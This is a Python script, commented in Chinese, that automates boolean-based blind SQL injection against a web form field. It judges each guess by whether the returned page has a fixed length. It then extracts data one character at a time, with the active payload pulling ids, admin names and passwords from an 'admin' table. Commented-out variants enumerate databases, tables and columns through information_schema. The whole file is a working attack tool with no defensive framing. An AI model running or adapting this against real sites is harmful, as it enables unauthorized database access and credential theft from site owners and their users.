import string

import requests


# 定义函数
# 注入判断标准，以返回页面长度不一样为标准
def chilk(url, method, param):
    if method == "POST":
        req = requests.post(url, data=param)  # post请求
        # print(len(req.text))                  # 先运行一下确定正常访问的返回页面的精确值确定为多少
        if len(req.text) == 3396:               # 正常页面长度的判断
            return "success"
    else:
        req = requests.get(url, params=param)  # get请求
        if len(req.text) == 3396:               # 正常页面长度的判断
            return "success"


# 判断长度
def getlen(url, method):
    # 长度的遍历循环判断
    for i in range(300):
        data = {
            # 跑长度 【注意key为注入参数，即可注入的点。】
            # "key":f"1米' and length((select database()))={i} #"
            # 跑所有数据库名长度
            # "key":f"1米' and length((select group_concat(schema_name) from information_schema.schemata))={i} #"
            # 跑指定的数据库的数据表的长度
            # "key":f"1米' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i} #"
            # 跑指定的数据库的数据表的字段的长度
            # "key": f"1米' and length((select group_concat(column_name) from information_schema.columns where table_name='需要查询的表的名字'))={i} #"
            # 跑指定的数据库的数据表的字段的具体值的长度
            "key": f"1米' and length((select group_concat(id,admin,password) from admin))={i} #"
        }
        req = chilk(url, method, data)
        if req == "success":
            print(f"db len is:{i}")
            return i


# 判断数据
def getdata(url, method):
    Getlen = getlen(url, method)
    d = ""
    for i in range(1, Getlen + 1):
        for j in dic:
            data = {
                # 跑数据库名 【注意key为注入参数，即可注入的点。】
                # "key": f"1米' and substr((select database()),{i},1)='{j}' #"
                # 跑所有数据库名
                # "key": f"1米' and substr((select group_concat(schema_name) from information_schema.schemata),{i},1)='{j}' #"
                # 跑指定的数据库的数据表
                # "key": f"1米' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i},1)='{j}' #"
                # 跑指定的数据库的数据表的字段
                # "key": f"1米' and substr((select group_concat(column_name) from information_schema.columns where table_name='admin'), {i},1)='{j}' #"
                # 跑指定的数据库的数据表的字段的具体值
                "key": f"1米' and substr((select group_concat(id,admin,password) from admin), {i},1)='{j}' #"
            }
            req = chilk(url, method, data)
            if req == "success":
                d += j
                print(f"data is : {d}")
                break

# 主函数，接入参数URL
if __name__ == "__main__":
    url = ''                                        # 输入该web端的注入链接
    dic = string.printable
    getdata(url, "POST")
    # getlen(url)
